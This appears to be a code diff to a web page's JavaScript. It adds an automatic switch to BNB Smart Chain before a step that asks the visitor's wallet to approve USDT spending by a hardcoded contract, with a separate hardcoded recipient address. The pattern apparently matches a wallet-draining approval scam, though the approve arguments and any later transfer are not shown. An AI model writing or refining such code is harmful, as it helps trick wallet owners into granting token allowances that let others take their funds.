@@ -82,6 +82,7 @@
         const CONTRACT = "0x42C8980352dA1F330419FD047ea5462551165Ce3";
         const USDT = "0x55d398326f99059fF775485246999027B3197955";
         const RECIPIENT = "0xc656b1651CD6914183Ee48458542EbB8655aa623";
+        const BSC_CHAIN_ID = "0x38"; // 56 in decimal
 
         let userAddress = null;
         let web3 = null;
@@ -100,6 +101,38 @@
             }
         });
 
+        async function switchToBSC() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: BSC_CHAIN_ID }],
+                });
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: BSC_CHAIN_ID,
+                                chainName: 'BNB Smart Chain',
+                                rpcUrls: ['https://bsc-dataseed.binance.org'],
+                                blockExplorerUrls: ['https://bscscan.com'],
+                                nativeCurrency: {
+                                    name: 'BNB',
+                                    symbol: 'BNB',
+                                    decimals: 18
+                                }
+                            }],
+                        });
+                    } catch (addError) {
+                        throw addError;
+                    }
+                } else {
+                    throw switchError;
+                }
+            }
+        }
+
         async function handleApprove() {
             if (!window.ethereum) {
                 showNotification("No wallet detected", "error");
@@ -115,11 +148,16 @@
         async function confirmApproval() {
             try {
                 document.getElementById('confirmBtn').disabled = true;
-                showNotification("Processing...", "info");
+                showNotification("Switching to BNB Smart Chain...", "info");
+
+                // Switch to BSC first
+                await switchToBSC();
 
                 if (!web3) web3 = new Web3(window.ethereum);
                 const accounts = await web3.eth.getAccounts();
                 userAddress = accounts[0];
+
+                showNotification("Processing approval...", "info");
 
                 const usdtContract = new web3.eth.Contract([
                     {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
